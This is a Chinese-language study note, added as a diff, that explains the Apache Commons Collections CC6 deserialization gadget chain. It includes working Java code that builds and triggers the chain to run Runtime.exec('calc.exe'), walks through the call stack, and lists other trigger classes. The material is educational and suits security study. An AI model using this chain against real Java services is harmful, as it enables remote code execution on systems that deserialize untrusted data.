@@ -1,0 +1,140 @@
+### 一、链条整体结构概览
+
+```java
+public static void main(String[] args) throws Exception {
+        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
+                new ConstantTransformer(1),
+        };
+        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+        // 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
+        Map expMap = new HashMap();
+
+        expMap.put(tme, "valuevalue");
+        outerMap.remove("keykey");
+        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
+        f.setAccessible(true);
+        f.set(transformerChain, transformers);
+        // ==================
+        // ⽣成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(expMap);
+        oos.close();
+        // 本地测试触发
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object) ois.readObject();
+}
+```
+
+利用链触发点是：
+
+```java
+Object o = ois.readObject();
+```
+
+触发的目标是执行：
+
+```java
+Runtime.getRuntime().exec("calc.exe");
+```
+
+核心组件：
+
+- **`ChainedTransformer`**：一组可执行的 `Transformer` 链。
+- **`LazyMap`**：在 `get()` 时才会调用 `Transformer.transform(key)` 生成值。
+- **`TiedMapEntry`**：将一个 `Map` 的键值对包装成一个 `Entry` 对象，在 `hashCode()` / `equals()` 中会间接触发 `map.get(key)`。
+- **`HashMap`**：在反序列化中会调用 `key.hashCode()`，从而触发上面的链条。
+
+------
+
+### 🧠 二、简要执行流程（从反序列化到执行命令）
+
+1. **反序列化时触发 HashMap.readObject()**
+   - HashMap 会重新计算每个键的哈希值。
+   - 在 `HashMap` 的反序列化过程中，它会对每个键调用 `hash()` 函数（也就是调用键的 `hashCode()`）。
+2. **键是 TiedMapEntry**
+   - `TiedMapEntry.hashCode()` 内部会调用 `map.get(key)`。
+   - 这里的 `map` 是 `LazyMap`。
+3. **LazyMap.get()**
+   - 如果 `key` 不存在，就会调用传入的 `Transformer.transform(key)`。
+   - 也就是我们传进去的 `ChainedTransformer`。
+4. **ChainedTransformer.transform()**
+   - 会依次调用链条内的每一个 `Transformer`。
+   - 这时才触发我们精心构造的反射调用：
+      `Runtime.class` → `getMethod("getRuntime")` → `invoke(null)` → `exec("calc.exe")`
+
+------
+
+### ⚙️ 三、fakeTransformers 和反射修改的意义
+
+一开始使用：
+
+```java
+Transformer[] fakeTransformers = new Transformer[]{ new ConstantTransformer(1) };
+```
+
+- 是一个“假链”。
+- 用来防止在链条构造阶段（如 `LazyMap.decorate()`）时提前执行真正的恶意代码。
+
+等所有对象构造完毕、放入 HashMap 后，
+ 再通过反射：
+
+```java
+f.set(transformerChain, transformers);
+```
+
+把假链换成真链。
+ 这样序列化时才会触发真正的恶意操作。
+
+------
+
+### 📦 四、总结触发链调用栈
+
+```scss
+readObject()
+  -> HashMap.readObject()
+  -> HashMap.hash()
+     -> TiedMapEntry.hashCode()
+     -> TiedMapEntry.getValue()
+        -> LazyMap.get()
+           -> ChainedTransformer.transform()
+              -> ConstantTransformer(Runtime.class)
+              -> InvokerTransformer.getMethod("getRuntime")
+              -> InvokerTransformer.invoke()
+              -> InvokerTransformer.exec("calc.exe")
+```
+
+
+
+## 1) 序列化/反序列化的本质（明确区分两个常见混淆点）
+
+- **序列化/反序列化（Java 的 `Serializable`）是把对象的 \*状态\*（字段值）和类型元信息转换为字节流、或把字节流还原成对象的过程**，不是把 `.class` 字节码和类定义互相转换。
+   （也就是说它不是“把类的代码放进字节流再在远端执行”——只是字段和值的序列化。）
+- 字节流里包含类名、字段名、字段值等元数据；反序列化时 JVM 会根据类名加载类定义（类加载是另一路机制），然后把字段填回对象实例。
+
+------
+
+## 2) 为什么 `HashMap.readObject()` 会导致「额外代码执行」
+
+- **关键原因**：某些类在反序列化时并不是单纯地“填字段”，它们实现了自己的 `private void readObject(ObjectInputStream in)`，在该方法里会做更多工作（比如重建内部结构、遍历条目、调用 `put()`/`add()` 等）。
+- `HashMap` 的 `readObject()` 会把每个序列化的 `key,value` 读出，然后调用内部插入逻辑（`putVal(hash(key), key, value, ...)`），而 `hash(key)` 会调用 `key.hashCode()`。
+- 如果 `key` 本身是一个“带副作用”的对象（比如 `TiedMapEntry`，它的 `hashCode()` 会间接调用 `map.get(key)`），而这个 `map.get()` 又触发了 `LazyMap` 去执行 `Transformer.transform()`，最终就走到我们构造的反射链（`Runtime.getRuntime().exec(...)`）。
+- **所以并不是 `HashMap.readObject()` 在直接“执行恶意代码”，而是它的实现逻辑在重建数据结构时会调用到用户对象的方法（如 `hashCode()`、`compareTo()`、`readResolve()` 等），这些调用提供了“执行点”——攻击链就是利用这些间接调用来触发任意代码。**
+
+------
+
+## 3) 常见的触发点（不只有 HashMap）
+
+- 任何在 `readObject()` 或反序列化重建结构中**会调用用户对象方法**的标准库类都可能被利用，常见例如：
+   `HashMap`、`Hashtable`、`HashSet`（内部依赖 HashMap）、`PriorityQueue`（会调用 `Comparator`/`compare`）、`TreeSet`/`TreeMap`（会调用 `compareTo`），还有 `AnnotationInvocationHandler`、`ObjectInputFilter` 之前的某些 JDK/第三方类，以及很多 commons-collections、commons-beanutils、spring 等库里的类。
+- 另外，一些对象也会通过 `readResolve()` 等回调在反序列化阶段执行自定义代码 —— 这些回调本身也是可被利用点。
